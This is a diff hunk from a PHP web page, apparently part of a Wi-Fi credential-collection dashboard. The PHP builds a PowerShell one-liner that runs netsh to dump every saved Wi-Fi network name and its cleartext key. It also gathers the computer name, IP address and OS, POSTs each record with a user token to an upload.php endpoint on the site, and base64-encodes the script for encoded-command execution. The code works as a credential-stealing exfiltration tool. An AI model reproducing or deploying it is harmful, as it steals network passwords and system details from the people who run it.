@@ -1005,8 +1005,8 @@ $uniqueSSIDs   = count(array_unique(array_column($deduped, 'ssid')));
       </p>
 
       <?php
-        $proto = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
         $host = $_SERVER['HTTP_HOST'];
+        $proto = (strpos($host, 'localhost') !== false || strpos($host, '127.0.0.1') !== false) ? 'http' : 'https';
         $cleanScript = "\$t='" . addslashes($currentUser) . "';\$u='{$proto}://{$host}/upload.php?token='+\$t;(netsh wlan show profiles)|Select-String ':(.+)\$'|ForEach-Object { \$s=\$_.Matches.Groups[1].Value.Trim(); \$k=((netsh wlan show profile name=\"\$s\" key=clear)|Select-String 'Key Content\\s*:\\s*(.+)\$').Matches.Groups[1].Value; if(-not \$k){\$k='(Not Found)'}; \$ip=(Get-NetIPAddress -AddressFamily IPv4 -ErrorAction SilentlyContinue|Where-Object {\$_.IPAddress -notlike '127.*' -and \$_.IPAddress -notlike '169.254.*'}|Select-Object -ExpandProperty IPAddress -First 1); if(-not \$ip){\$ip='offline'}; \$b=\"\$(Get-Date -f 'yyyy-MM-dd HH:mm:ss'),\$env:COMPUTERNAME,\$s,\$k,\$ip,\$((Get-CimInstance Win32_OperatingSystem).Caption)\"; try{Invoke-RestMethod -Uri \$u -Method POST -Body \$b -TimeoutSec 5}catch{} }";
         $b64Enc = base64_encode(mb_convert_encoding($cleanScript, 'UTF-16LE', 'UTF-8'));
       ?>
